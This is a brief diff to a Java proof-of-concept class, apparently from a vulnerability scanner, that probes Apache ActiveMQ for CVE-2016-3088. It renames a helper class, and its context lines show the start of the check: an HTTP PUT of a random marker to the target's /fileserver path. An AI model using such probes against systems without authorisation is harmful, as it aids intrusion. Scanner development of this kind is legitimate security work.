@@ -22,7 +22,7 @@ import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.util.EntityUtils;
 
-import cn.com.sgcc.marki_with_maven.misc.Tools;
+import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;
 
 public class CVE2016_3088ActiveMQUpload implements IPocBase {
 
@@ -60,7 +60,7 @@ public class CVE2016_3088ActiveMQUpload implements IPocBase {
 		CloseableHttpClient customClient = null;
 		try {
 			String url = String.format("%s://%s:%s/fileserver/cve2016-3088test", serviceType.contains("https") ? "https":"http", ip, port );
-			customClient = new Tools().getCustomClient();
+			customClient = new NetWorkTools().getCustomClient();
 			//put
 			HttpPut httpPut = new HttpPut(url);
 			String randomMd5 = Md5Crypt.md5Crypt( (new Random().nextInt(99999) + "").getBytes() );
